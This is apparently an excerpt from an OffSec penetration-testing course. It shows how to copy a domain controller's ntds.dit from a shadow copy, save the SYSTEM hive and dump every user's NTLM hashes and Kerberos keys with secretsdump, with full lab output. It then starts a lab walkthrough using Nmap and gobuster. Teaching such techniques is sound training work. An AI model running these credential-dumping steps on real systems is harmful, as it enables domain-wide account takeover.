### Copying the AD Database from Shadow Copy to C: Drive

To copy the entire Active Directory (AD) database from the shadow copy to the root folder of the C: drive, use the following command. This command specifies the shadow copy device name and appends the full `ntds.dit` path.

```cmd
C:\Tools>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
1 file(s) copied.
```

**Listing 863 - Copying the ntds database to the C: drive**

### Extracting the SYSTEM Hive from the Windows Registry

To correctly extract the content of `ntds.dit`, you need to save the SYSTEM hive from the Windows registry. This can be done using the `reg` utility with the `save` argument.

```cmd
C:\>reg.exe save hklm\system c:\system.bak
The operation completed successfully.
```

**Listing 864 - Saving the SYSTEM hive to the C: drive**

### Extracting Credential Materials with secretsdump

Once the `.bak` files are moved to your Kali machine, you can continue extracting the credential materials using the `secretsdump` tool from the Impacket suite. Supply the `ntds` database and the `system` hive via the `-ntds` and `-system` options, respectively, along with the `LOCAL` keyword to parse the files locally.

```bash
kali@kali:~$ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Target system bootKey: 0xbbe6040ef887565e9adb216561dc0620
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 98d2b28135d3e0d113c4fa9d965ac533
[*] Reading and decrypting hashes from ntds.dit.bak
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC1$:1000:aad3b435b51404eeaad3b435b51404ee:eda4af1186051537c77fa4f53ce2fe1a:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1693c6cefafffc7af11ef34d1c788f47:::
dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
stephanie:1104:aad3b435b51404eeaad3b435b51404ee:d2b35e8ac9d8f4ad5200acc4e0fd44fa:::
jeff:1105:aad3b435b51404eeaad3b435b51404ee:2688c6d2af5e9c7ddb268899123744ea:::
jeffadmin:1106:aad3b435b51404eeaad3b435b51404ee:e460605a9dbd55097c6cf77af2f89a03:::
iis_service:1109:aad3b435b51404eeaad3b435b51404ee:4d28cf5252d39971419580a51484ca09:::
WEB04$:1112:aad3b435b51404eeaad3b435b51404ee:87db4a6147afa7bdb46d1ab2478ffe9e:::
FILES04$:1118:aad3b435b51404eeaad3b435b51404ee:d75ffc4baaeb9ed40f7aa12d1f57f6f4:::
CLIENT74$:1121:aad3b435b51404eeaad3b435b51404ee:5eca857673356d26a98e2466a0fb1c65:::
CLIENT75$:1122:aad3b435b51404eeaad3b435b51404ee:b57715dcb5b529f212a9a4effd03aaf6:::
pete:1123:aad3b435b51404eeaad3b435b51404ee:369def79d8372408bf6e93364cc93075:::
jen:1124:aad3b435b51404eeaad3b435b51404ee:369def79d8372408bf6e93364cc93075:::
CLIENT76$:1129:aad3b435b51404eeaad3b435b51404ee:6f93b1d8bbbe2da617be00961f90349e:::
[*] Kerberos keys from ntds.dit.bak
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 802
Made in Morocco
Penetration Testing with Kali Linux
Administrator:aes256-cts-hmac-sha1-96:56136fd5bbd512b3670c581ff98144a553888909a7bf8f0fd4c424b0d42b0cdc
Administrator:aes128-cts-hmac-sha1-96:3d58eb136242c11643baf4ec85970250
Administrator:des-cbc-md5:fd79dc380ee989a4
DC1$:aes256-cts-hmac-sha1-96:fb2255e5983e493caaba2e5693c67ceec600681392e289594b121dab919cef2c
DC1$:aes128-cts-hmac-sha1-96:68cf0d124b65310dd65c100a12ecf871
DC1$:des-cbc-md5:f7f804ce43264a43
krbtgt:aes256-cts-hmac-sha1-96:e1cced9c6ef723837ff55e373d971633afb8af8871059f3451ce4bccfcca3d4c
krbtgt:aes128-cts-hmac-sha1-96:8c5cf3a1c6998fa43955fa096c336a69
krbtgt:des-cbc-md5:683bdcba9e7c5de9
...
[*] Cleaning up...
```

**Listing 865 - Extracting credentials from the ntds database**

### Obtaining NTLM Hashes and Kerberos Keys

We have successfully obtained NTLM hashes and Kerberos keys for every AD user, which can now be further cracked or used in pass-the-hash attacks.

While these methods are effective, they leave an access trail and may require uploading tools. An alternative is to abuse AD functionality to capture hashes remotely from a workstation. For example, you could move laterally to the domain controller and run Mimikatz to dump the password hash of every user using the DC sync method, which can be a less conspicuous persistence technique.

### Evaluating Stealthiness

Although most penetration tests do not require stealth, it is important to evaluate the stealthiness of a given technique, as this can be useful during red-teaming engagements.

### Summary of Learning Unit

In this learning unit, we explored several Windows Active Directory persistence techniques that can be employed during penetration testing or red-teaming exercises. These techniques are essential for maintaining long-term access to a compromised environment, as mandated by the rules of engagement.

### Wrapping Up

This module concludes the overview of Active Directory concepts, covering various lateral movement and persistence techniques. While many techniques have been mentioned and explained, there are many others worth exploring and some yet to be discovered. The effectiveness of these techniques depends on the security posture of the environment being tested. Although AD security has improved over the years, its attack surface is still dependent on the complexity of its design and interoperability with legacy systems that may impose lower security standards.

Mastering Active Directory enumeration, authentication, and lateral movement techniques is a crucial step in becoming an experienced penetration tester.

**PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 804**
**Made in Morocco**
**Penetration Testing with Kali Linux**

### Assembling the Pieces

In this learning module, we will cover the following learning units:

- Enumerating the Public Network
- Attacking a Public Machine
- Gaining Access to the Internal Network
- Enumerating the Internal Network
- Attacking an Internal Web Application
- Gaining Access to the Domain Controller

Now that we have introduced all the individual pieces of a penetration test, it’s time to put them together in a walkthrough. In this module, we will conduct a simulated penetration test inspired by real-world findings.

#### Enumerating the Public Network

This learning unit covers the following objectives:

- Enumerate machines on a public network
- Obtain useful information for later attacks

We’ll start with the first step of our penetration test: enumeration. Our fictitious client, BEYONiD Finances, has provided us with two initial targets, WEBSRV1 and MAILSRV1, accessible via the PEN200 VPN. The network overview is shown below.

**Figure 286: Network Overview of Provided Targets**

The third octet in your lab instance may differ when starting the VM group.

#### Setting Up the Work Environment

Before interacting with the target, let’s set up a basic work environment for our penetration test. This will help us store obtained files and information in a structured way throughout the assessment.

```bash
kali@kali:~$ mkdir beyond
kali@kali:~$ cd beyond
kali@kali:~/beyond$ mkdir mailsrv1
kali@kali:~/beyond$ mkdir websrv1
kali@kali:~/beyond$ touch creds.txt
```

**Listing 866 - Basic work environment for this penetration test**

#### Enumerating MAILSRV1

Now that we have set up the work environment, we are ready to enumerate the first target machine, MAILSRV1.

Documenting findings is crucial for every penetration test. For this module, we’ll store results in the basic work environment we just set up. Markdown editors like Obsidian are popular for documenting findings and data in real assessments, as they are application-independent and simplify report writing and collaboration.

Let’s begin with a port scan of MAILSRV1 using Nmap. A port scan is often the first active information gathering method to get an overview of open ports and accessible services.

```bash
kali@kali:~/beyond$ sudo nmap -sC -sV -oN mailsrv1/nmap 192.168.50.242
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-29 08:53 EDT
Nmap scan report for 192.168.50.242
Host is up (0.11s latency).
Not shown: 992 closed tcp ports (reset)
PORT STATE SERVICE VERSION
25/tcp open smtp hMailServer smtpd
| smtp-commands: MAILSRV1, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp open http Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods:
|_ Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
110/tcp open pop3 hMailServer pop3d
|_pop3-capabilities: UIDL USER TOP
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
143/tcp open imap hMailServer imapd
|_imap-capabilities: IMAP4 CHILDREN OK ACL IMAP4rev1 completed CAPABILITY NAMESPACE IDLE RIGHTS=texkA0001 SORT QUOTA
445/tcp open microsoft-ds?
587/tcp open smtp hMailServer smtpd
| smtp-commands: MAILSRV1, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
Service Info: Host: MAILSRV1; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb2-time:
| date: 2022-09-29T12:54:00
|_ start_date: N/A
| smb2-security-mode:
| 3.1.1:
|_ Message signing enabled but not required
|_clock-skew: 21s
Service detection performed. Please report any incorrect results at
https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.95 seconds
```

**Listing 867 - Nmap scan of MAILSRV1**

The Nmap scan shows that MAILSRV1 is a Windows system running an IIS web server and hMailServer. We can research hMailServer to identify potential vulnerabilities. However, since Nmap did not discover a version number, a broader search is needed.

**Figure 287: Vulnerabilities of hMailServer**

Next, let’s enumerate the IIS web server. First, we’ll browse the web page.

**Figure 288: IIS Welcome Page on MAILSRV1**

The IIS welcome page only displays the default page. Let’s try to identify directories and files using gobuster.

```bash
kali@kali:~/beyond$ gobuster dir -u http://192.168.50.242 -w /usr/share/wordlists/dirb/common.txt -o mailsrv1/gobuster -x txt,pdf,config
===============================================================
```

**PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 809**
**Made in Morocco**
**Penetration Testing with Kali Linux**